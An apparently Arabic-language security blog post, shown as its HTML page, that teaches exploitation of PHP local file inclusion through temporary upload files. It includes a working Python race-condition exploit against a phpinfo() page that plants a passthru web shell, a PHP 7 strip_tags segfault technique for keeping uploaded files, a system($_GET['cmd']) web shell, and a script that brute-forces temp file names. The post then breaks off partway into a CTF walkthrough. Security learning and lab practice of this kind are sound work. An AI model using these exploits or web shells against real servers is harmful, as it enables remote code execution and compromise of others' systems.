<!DOCTYPE html>
<html lang="en" data-theme="light"><head>
    <title> MtucX | lfi </title>
    <meta charset="utf-8"><meta name="generator" content="Hugo 0.70.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
    <meta name="description" content="Call me 4dla3">
    
    <link rel="stylesheet" href="https://h4dla3.github.io/css/style.min.67cd718c0a3c8009c771494d381fb7128246a454bd0518fed97cb65d257db948.css" integrity="sha256-Z81xjAo8gAnHcUlNOB&#43;3EoJGpFS9BRj&#43;2Xy2XSV9uUg=" crossorigin="anonymous" type="text/css">
    
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
    
    <link rel="shortcut icon" href="https://h4dla3.github.io/favicons/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" sizes="180x180" href="https://h4dla3.github.io/favicons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://h4dla3.github.io/favicons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://h4dla3.github.io/favicons/favicon-16x16.png">
    <link rel="canonical" href="https://h4dla3.github.io/post/ctf_tips/">
    
    
    <script type="text/javascript" src="https://h4dla3.github.io/js/anatole-header.min.c275265a259296f3dd50e8236a77fcbcadb1dbb9597d3045c675dcc2c7c58a93.js" integrity="sha256-wnUmWiWSlvPdUOgjanf8vK2x27lZfTBFxnXcwsfFipM=" crossorigin="anonymous"></script>
    <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://h4dla3.github.io/images/site-feature-image.png"/>

<meta name="twitter:title" content="lfi"/>
<meta name="twitter:description" content="بسم الله الرحمن الرحيم
السلام عليكم ورحمة الله تعالى و بركاته
https://www.php.net/manual/en/function.include.php
https://www.php.net/manual/en/function.phpinfo
في البداية
Understanding PHP temporary files
في البداية
https://www.php.net/manual/en/features.file-upload.post-method.php
https://www.php.net/manual/en/features.file-upload.put-method.php
https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/features.file-upload.html
يمكننا استعمال بوست او put ميثود لرفع الملفات في بي اش بي , بعد رفع الملف , الملف سوف يحفظ في global variables يدعى $_files الاراي تحتوي على بعض المعلومات كالتالي"/>

</head><body><div class="sidebar animated fadeInDown">
    <div class="logo-title">
      <div class="title">
        <img src="https://h4dla3.github.io/images/mtucx.jpg" alt="profile picture">
        <h3 title=""><a href="/">MtucX</a></h3>
        <div class="description">
          <p>Call me 4dla3</p>
        </div>
      </div>
    </div>
    <ul class="social-links">
        
        <li>
        <a href="https://github.com/h4dla3" rel="me" aria-label="GitHub">
          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
        </a>          
        </li>

        
    </ul>
    <div class="footer">
        <div class="by_farbox">&copy; MtucX 2020 </div>
      </div>
    </div>
</div><div class="main">
            <div class="page-top animated fadeInDown">
    <ul class="nav">
        
        
        
        <li><a  href="/" title="">Home</a></li>
        
        
        <li><a  href="/post/" title="">Posts</a></li>
        
        
        <li><a  href="/about/" title="">About</a></li>
        
    </ul>
    <div class="themeswitcher">
        <a class="theme-switch" title="Switch Theme">
            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
        </a>
    </div>
</div>

            <div class="autopagerize_page_element">
                <div class="content">
<div class="post animated fadeInDown">
    <div class="post-content">

      <div class="post-title">
        <h3>lfi
        </h3>
        
        <div class="info">
          <i class="fa fa-sun-o"></i><span class="date">Fri, Jul 10, 2020</span>
          <i class="fa fa-clock-o"></i><span class="reading-time">6-minute read</span>
        </div>
        
        </div>

    <!-- raw HTML omitted -->
<p>بسم الله الرحمن الرحيم</p>
<p>السلام عليكم ورحمة الله تعالى و بركاته</p>
<p><a href="https://www.php.net/manual/en/function.include.php">https://www.php.net/manual/en/function.include.php</a></p>
<p><a href="https://www.php.net/manual/en/function.phpinfo">https://www.php.net/manual/en/function.phpinfo</a></p>
<p>في البداية</p>
<p>Understanding PHP temporary files</p>
<p>في البداية</p>
<p><a href="https://www.php.net/manual/en/features.file-upload.post-method.php">https://www.php.net/manual/en/features.file-upload.post-method.php</a></p>
<p><a href="https://www.php.net/manual/en/features.file-upload.put-method.php">https://www.php.net/manual/en/features.file-upload.put-method.php</a></p>
<p><a href="https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/features.file-upload.html">https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/features.file-upload.html</a></p>
<p>يمكننا استعمال بوست او put ميثود لرفع الملفات
في بي اش بي , بعد رفع الملف , الملف سوف يحفظ في global variables يدعى $_files
الاراي تحتوي على بعض المعلومات
كالتالي</p>
<p><img src="/images/2020-07-10_094131.png" alt="Images"></p>
<p>للمزيد من المعلومات</p>
<p><a href="https://arabicprogrammer.com/article/8708534101/">https://arabicprogrammer.com/article/8708534101/</a></p>
<p>بعد رفع الملف سوف يخزن في default temp dir
للسيرفر
by default</p>
<p>يمكنك ان تجده كالتالي في php.ini</p>
<p><img src="/images/2020-07-10_105221.png" alt="Images"></p>
<p>ملاحظة انا هنا قمت بتغييره الى d:/phpstudy_pro/temp</p>
<p>قبل التعدلي عليه كان ; upload_tmp_dir</p>
<p>اظن في wamp c:/wamp/tmp</p>
<p>المهم يمكنك معرفة من php.ini كالصورة اعلاه</p>
<p>في ubuntu سوف تكون كالتالي</p>
<pre><code>cat /etc/php/7.0/apache2/php.ini | grep upload_tmp
;upload_tmp_dir =
</code></pre><p>اذا كان المسار الخاص ب upload_tmp_dir غير writable . بي اش بي
سوف يقوم بحفظه في system default temp dir .</p>
<p>اذا كان upload_tmp_dir غير محدد</p>
<p>سيتم استخدام  temp directory الافتراضي للنظام</p>
<p>sys_get_temp_dir()</p>
<!-- raw HTML omitted -->
<pre><code>default

C:\Users\lol&gt;php -r &quot;echo sys_get_temp_dir();&quot;
C:\Users\lol\AppData\Local\Temp

edited
قمت بتغييره في php.ini ايضا

sys_temp_dir = &quot;D:/phpstudy_pro/temp&quot;

C:\Users\lol&gt;php -r &quot;echo sys_get_temp_dir();&quot;
D:/phpstudy_pro/temp
C:\Users\lol&gt;

</code></pre><p>ubuntu</p>
<pre><code>➜ ~ php -r &quot;echo sys_get_temp_dir();&quot;
/tmp
➜  ~ 
</code></pre><!-- raw HTML omitted -->
<h1 id="التسمية-للملفات-المؤقتة">التسمية للملفات المؤقتة</h1>
<p>بعد التحميل والتخزين في temp directory ،
قواعد تسمية الملفات المؤقتة هي كما يلي: الافتراضي هو php+4 أو php+6 أرقام عشوائية وأحرف كبيرة وصغيرة</p>
<p>مثال :</p>
<!-- raw HTML omitted -->
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
$file <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmpfile</span>();
$path <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_get_meta_data</span>($file)[<span style="color:#e6db74">&#39;uri&#39;</span>];
<span style="color:#66d9ef">print</span> $path<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;

</code></pre></div><p>windows</p>
<p><img src="/images/2020-07-10_121408.png" alt="Images"></p>
<!-- raw HTML omitted -->
<p>ترى في ويندوز</p>
<p>php????.tmp</p>
<p>يحتوي على لاحقة tmp تحت النوافذ ، ويحتوي الملف على أربعة أحرف عشوائية</p>
<p>linux كما نرى في</p>
<p>لا يوجد لاحقة في Linux ، ولكن الأحرف العشوائية للملف تتكون بشكل عام من ستة أرقام ،</p>
<!-- raw HTML omitted -->
<p>php???????</p>
<!-- raw HTML omitted -->
<p><img src="/images/2020-07-10_123241.png" alt="Images"></p>
<p>كما نلاحظ فانه يكون ارقام و حروف كبيرة و صغير و يكون عشوائية</p>
<p>في ويندوز بي اتش بي يستعمل GetTempFileName()
و في لينكس and mkstemp()</p>
<p>للمزيد من المعلومات</p>
<p><a href="https://stackoverflow.com/questions/13037969/how-are-tmp-file-names-in-php-generated">https://stackoverflow.com/questions/13037969/how-are-tmp-file-names-in-php-generated</a></p>
<p><a href="https://linux.die.net/man/3/mktemp">https://linux.die.net/man/3/mktemp</a></p>
<p><a href="https://linux.die.net/man/3/mkstemp">https://linux.die.net/man/3/mkstemp</a></p>
<p><a href="https://stackoverflow.com/questions/29250512/php-uploads-filesfilenametmp-name-uniqueness">https://stackoverflow.com/questions/29250512/php-uploads-filesfilenametmp-name-uniqueness</a></p>
<p><a href="https://github.com/php/php-src/blob/master/main/php_open_temporary_file.c">https://github.com/php/php-src/blob/master/main/php_open_temporary_file.c</a></p>
<p>الصورة من PHP_LFI_rfc1867_temporary_files</p>
<p>في الصورة التالية</p>
<p>مخطط دورة التشغيل لـ PHP عند تحميل الملفات من خلال  POST.</p>
<p><img src="/images/2020-07-10_110539.png" alt="Images"></p>
<p>يمكنك أن ترى أن فترة بقاء ملفاتنا المؤقتة هي الفترة الزمنية كالتالي</p>
<p><img src="/images/2020-07-10_1105391.png" alt="Images"></p>
<p>لو انه php انتهى بدون مشاكل و الملف لم ينقل الى مكان اخر او اعادة تسميته</p>
<p>سيتم حذف الملف في نهاية form request</p>
<h1 id="انتباه">انتباه</h1>
<p>ولكن لو انه لم ينتهي بشكل غير طبيعي أثناء تشغيل php</p>
<p>مثل حدوث crash فانه سيتم الاحتفاظ بهذا الملف المؤقت بشكل دائم.</p>
<h1 id="كيفية-الحصول-على-اسم-الملف">كيفية الحصول على اسم الملف</h1>
<p>1 - لدينا lfi و عرفنا كيفية التسمية للملفات المؤقة
يمكننا عمل تخمين على اسم الملف يمكن استعمال سكربت لعمل تخمين</p>
<p>2 - تتمثل الطريقة في الحصول من خلال  /proc/self/fd/* ، يبدأ * من 10 ، ويتم هنا الحصول على بعض الروابط الرمزية لمعرف العملية قيد التشغيل حاليًا. تعتمد فعالية هذه الطريقة على حجم الملف الذي تم تحميله ، ويمكن أن تزيد الملفات الكبيرة من وقت المحاولة.</p>
<p>3 - في ويندوز . يمكنك استعمال FindFirstFile method
للمزيد من المعلومات يمكنك دراسة السورس الخاص ب fimap او البحث في قوقل</p>
<p><a href="https://github.com/kurobeats/fimap/wiki/FimapFindFirstFileExploit">https://github.com/kurobeats/fimap/wiki/FimapFindFirstFileExploit</a></p>
<h1 id="exploiting-time">Exploiting time</h1>
<p>الان بعد معرفة بعض الاساسيات
ننتقل الى الشرح</p>
<h1 id="lfi-with-phpinfo-assistance">LFI With PHPInfo Assistance</h1>
<p><a href="https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf">https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf</a></p>
<p><a href="http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf">http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf</a></p>
<p>فل نقل انه هناك local file include
لكنك لم تجد اي طريقة لاستغلالها و لكنه يوجد
phpinfo() script</p>
<p>لدينا المثال التالي</p>
<!-- raw HTML omitted -->
<p>index.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>]);
<span style="color:#75715e">?&gt;</span>
</code></pre></div><p>info.php</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#a6e22e">phpinfo</span>();
<span style="color:#75715e">?&gt;</span>
</code></pre></div><!-- raw HTML omitted -->
<p>تكمن الفكرة وراء أسلوب الاستغلال هذا في أنه إذا قبلت PHP تحميل الملفات كالتالي.</p>
<p><img src="/images/2020-07-09_214428.png" alt="Images"></p>
<p><img src="/images/2020-07-09_214614.png" alt="Images"></p>
<p>من خلال محاولة اجراء عدة upload post لل phpinfo سكريبت
والتحكم بعناية في القراءات ، فمن الممكن
استرداد اسم الملف المؤقت وتقديم طلب إلى البرنامج النصي LFI</p>
<p>إذا تمكنا من إنشاء ملف كبير بما فيه الكفاية مع كود php  ، يجب أن نكون قادرين على التقاط هذه التعليمات قبل حذف الملف ،</p>
<p>وبالتالي  race condition.</p>
<p>يمكنك استعمال السكربت التالي</p>
<!-- raw HTML omitted -->
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> ssl
<span style="color:#f92672">import</span> socket
<span style="color:#f92672">import</span> urllib3

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">SubstrFind</span>(resp, toFind):
	<span style="color:#66d9ef">if</span>(len(toFind) <span style="color:#f92672">&gt;</span> len(resp)):
		<span style="color:#66d9ef">return</span> []

	found <span style="color:#f92672">=</span> False
	indexes <span style="color:#f92672">=</span> []

	<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,(len(resp)<span style="color:#f92672">-</span>len(toFind))<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
		<span style="color:#66d9ef">if</span>(ord(resp[x]) <span style="color:#f92672">==</span> ord(toFind[<span style="color:#ae81ff">0</span>])):
			found <span style="color:#f92672">=</span> True
			<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(toFind)):
				<span style="color:#66d9ef">if</span>(ord(resp[x<span style="color:#f92672">+</span>i]) <span style="color:#f92672">!=</span> ord(toFind[i])):
					found <span style="color:#f92672">=</span> False
					<span style="color:#66d9ef">break</span>
		<span style="color:#66d9ef">if</span>(found):
			indexes<span style="color:#f92672">.</span>append(x)
			found <span style="color:#f92672">=</span> False
			x <span style="color:#f92672">+=</span> len(toFind)

	<span style="color:#66d9ef">return</span> indexes

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">phpinfo_ext</span>(content):
	indexes <span style="color:#f92672">=</span> SubstrFind(content, <span style="color:#e6db74">&#34;Security Test&#34;</span>)
	found <span style="color:#f92672">=</span> len(indexes) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>
	got <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

	<span style="color:#66d9ef">if</span>(found):
		start <span style="color:#f92672">=</span> indexes[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span>
		<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(start, len(content)):
			<span style="color:#66d9ef">if</span>(content[x] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&lt;&#39;</span>):
				<span style="color:#66d9ef">break</span>
			got <span style="color:#f92672">+=</span> content[x]

	<span style="color:#66d9ef">return</span> got

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">phpinfo_request</span>(): 
	TAG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Security Test&#34;</span>
	PAYLOAD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">&lt;?php $c=fopen(&#39;/tmp/ccc&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php passthru($_GET[&#34;f&#34;]);?&gt;&#39;);?&gt;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> TAG
	REQ1_DATA<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;-----------------------------7dbff1ded0714</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;dummyname&#34;; filename=&#34;test.txt&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Content-Type: text/plain</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">%s</span><span style="color:#e6db74">
</span><span style="color:#e6db74">-----------------------------7dbff1ded0714--</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> PAYLOAD
	padding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">6000</span>
	REQ1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;POST /info.php&#34;&#34;&#34;&#34;&#34;&#34; HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Z: &#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Cookie: othercookie=&#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">HTTP_ACCEPT: &#34;&#34;&#34;</span> <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">HTTP_USER_AGENT: &#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">HTTP_ACCEPT_LANGUAGE: &#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">HTTP_PRAGMA: &#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Content-Length: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Host: 127.0.0.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">%</span>(len(REQ1_DATA),REQ1_DATA)

	got <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> 
	sc <span style="color:#f92672">=</span> urllib3<span style="color:#f92672">.</span>connection_from_url(<span style="color:#e6db74">&#39;http://127.0.0.1&#39;</span>)<span style="color:#f92672">.</span>_new_conn()
	sc<span style="color:#f92672">.</span>connect()
	sc <span style="color:#f92672">=</span> sc<span style="color:#f92672">.</span>sock

	payload <span style="color:#f92672">=</span> REQ1
	sc<span style="color:#f92672">.</span>send(payload)

	resp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
	<span style="color:#66d9ef">while</span> <span style="color:#e6db74">&#39;tmp_name&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> resp:
		x <span style="color:#f92672">=</span> sc<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
		<span style="color:#66d9ef">if</span> x <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>:
			<span style="color:#66d9ef">break</span>
		resp <span style="color:#f92672">+=</span> x
	<span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;tmp_name&#34;</span> <span style="color:#f92672">in</span> resp):
		found <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
		lines <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
		<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
			<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;tmp_name]&#34;</span> <span style="color:#f92672">in</span> line:
				mystr <span style="color:#f92672">=</span> str(line)
				array <span style="color:#f92672">=</span> mystr<span style="color:#f92672">.</span>split()
				tmp_name <span style="color:#f92672">=</span> array[<span style="color:#ae81ff">2</span>]
				<span style="color:#66d9ef">print</span>(tmp_name)
				<span style="color:#66d9ef">break</span>
		tmp_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1/index.php?file=&#34;</span> <span style="color:#f92672">+</span> tmp_name
		r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(tmp_url)<span style="color:#75715e">#</span>

		content <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>content
		<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Security Test&#39;</span> <span style="color:#f92672">in</span> content:
			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;done&#34;</span>
			exit()
		<span style="color:#66d9ef">else</span>:
			<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;wait ... &#39;</span>)

	<span style="color:#66d9ef">return</span> got
		


<span style="color:#66d9ef">while</span> True:
	<span style="color:#66d9ef">print</span>(phpinfo_request())
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo inotifywait -m -r /tmp
</code></pre></div><p><img src="/images/2020-07-10_153338.png" alt="Images"></p>
<!-- raw HTML omitted -->
<p>كما نلاحظ في الصورة انه قام بانشاء ملف يدعى ccc
وقام بالتعديل عليه لكنه لم يقم بحذفه</p>
<p>الان
نذهب الى المتصفح و نجرب</p>
<p><img src="/images/2020-07-10_154005.png" alt="Images"></p>
<!-- raw HTML omitted -->
<p>ctf challenge : <a href="https://h4dla3.github.io/post/eagle-jump/">https://h4dla3.github.io/post/eagle-jump/</a> اقرا الجزء الثاني من التحدي</p>
<p>docker container : <a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>
<h1 id="-php7-segment-fault--using-phpfilterstringstrip_tags">( php7 segment fault ) using php://filter/string.strip_tags</h1>
<!-- raw HTML omitted -->
<p>شروط الاستخدام اصدارات php التالية</p>
<p>php7.0.0-7.1.2</p>
<p>php7.1.3-7.2.1</p>
<p>php7.2.2-7.2.8</p>
<p>هناك ثغرة lfi
يمكننا استعمال php://filter/string.strip_tags
لجعل php
يعمل crash</p>
<p>اذا تم رفع ملف في نفس الوقت (يعني وقت حدوث الكراش)</p>
<p>سيتم حفظ الملف المؤقت في upload_tmp_dir
directory
المحدد ، لذلك لن يتم حذفه ، وسيتم تخزينه دائمًا في الدليل المؤقت للخدمة.</p>
<p>segment fault سبب حدوث الكراش
null pointer refernce</p>
<!-- raw HTML omitted -->
<p>. <code>atoi(NULL)</code></p>
<!-- raw HTML omitted -->
<p>مثال</p>
<p>هنا الاصدار لم يحدث شيء</p>
<p><img src="2020-07-10_173120.png" alt="image"></p>
<p>هنا حدث crash</p>
<p><img src="2020-07-10_173327.png" alt="image"></p>
<p>الان نرى</p>
<!-- raw HTML omitted -->
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>]);
<span style="color:#75715e">?&gt;</span>
</code></pre></div><!-- raw HTML omitted -->
<p>الان نجرب في browser</p>
<p>سوف نحصل على شيء مثل هذا</p>
<p><img src="2020-07-10_172649.png" alt="image"></p>
<p>من التحدي السابق</p>
<p>فسنرى انه يقوم بحذف الملف دائما كما قمنا بالشرح فوق</p>
<p><img src="/images/2020-07-10_153338.png" alt="Images"></p>
<p><img src="/images/2020-07-10_1105391.png" alt="Images"></p>
<p>نجرب الان</p>
<p>نجرب نحمل اي ملف</p>
<!-- raw HTML omitted -->
<p>mtucx.txt</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;mtucx&#39;</span>;
<span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
<span style="color:#f92672">&gt;</span>
</code></pre></div><p><img src="2020-07-10_174146.png" alt="image"></p>
<!-- raw HTML omitted -->
<p>لو نرى هنا
اين انا اضع رقم 2 فاننا نرى
لم يقم بحذف الملف المؤقت
بسبب crash</p>
<p>كما قلنا في الشرح فوق</p>
<p>نجرب</p>
<p><img src="2020-07-10_174402.png" alt="image"></p>
<p>تمام هنا انا عرف اسم tmp filename</p>
<p>اذا لم نكن نعرف يمكننا ان نعمل تخمين على الملف</p>
<p>يمكنك عمل سركبت لعمل ذلك او يمكنك استعمال burp wfuzz gobuster dirbuster &hellip; etc</p>
<p>في البداية نجرب نرسل الكثير من الريكوست</p>
<p>يمكنك عمل سكربت لذلك</p>
<p><img src="2020-07-10_200751.png" alt="image"></p>
<p>ارسل اكثر لتزيد فرص و سرعة التخمين
المهم ارجو ان تكون فهمت مقصودي</p>
<!-- raw HTML omitted -->
<p>python script</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#75715e"># -*- coding: utf-8 -*-</span>

<span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> random
<span style="color:#f92672">import</span> datetime

charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&#34;</span>

base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_filename</span>():
    ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
        ret <span style="color:#f92672">+=</span> random<span style="color:#f92672">.</span>choice(charset)
    <span style="color:#66d9ef">return</span> ret

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_force_tmp_files</span>():
    filename <span style="color:#f92672">=</span> get_filename()
    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{}/index.php?lfi=/tmp/php{}&#34;</span><span style="color:#f92672">.</span>format(base_url, filename)
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;php&#34;</span> <span style="color:#f92672">+</span> filename
    <span style="color:#66d9ef">try</span>:
        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;mtucx&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
            <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Include success!&#34;</span>
            <span style="color:#66d9ef">print</span> url
            exit()
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
        <span style="color:#66d9ef">pass</span>


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    flag <span style="color:#f92672">=</span> False
    <span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
        brute_force_tmp_files()
        <span style="color:#66d9ef">pass</span>


<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    main()
</code></pre></div><!-- raw HTML omitted -->
<p>باستعمال burpsuite
انا لا استعمل burpsuite في معظم الاحيان لكن بما ان كل الناس تستعملها اردت الشرح عليها</p>
<p><img src="/images/2020-07-10_200156.png" alt="Images"></p>
<p>راجع الجزء الخاص بالتسمية فوق</p>
<p>بعد بضع ساعات او اشهر او اعوام &hellip;.</p>
<p><img src="/images/2020-07-10_204834.png" alt="Images"></p>
<h1 id="الان-ناتي-الى-مثال-ctf">الان ناتي الى مثال ctf</h1>
<p>في البداية نعمل fuzzخفيف</p>
<p><img src="/images/2020-07-10_191555.png" alt="Images"></p>
<p>وجدنا انه هناك ملف dir.php
سنعود اليه لاحقا</p>
<p>نرى السورس الخاص بالصفحة</p>
<p><img src="/images/2020-07-10_191636.png" alt="Images"></p>
<p>نرى انه هناك
اذا md5 للسيكرت و الاسم == الباسوورد</p>
<p>pass=md5(??)&amp;</p>
<p>نلاحظ ان هناك هاش في الكوكيز باسم هاش</p>
<p><img src="/images/2020-07-10_191803.png" alt="Images"></p>
<p>نرى الطول</p>
<!-- raw HTML omitted -->
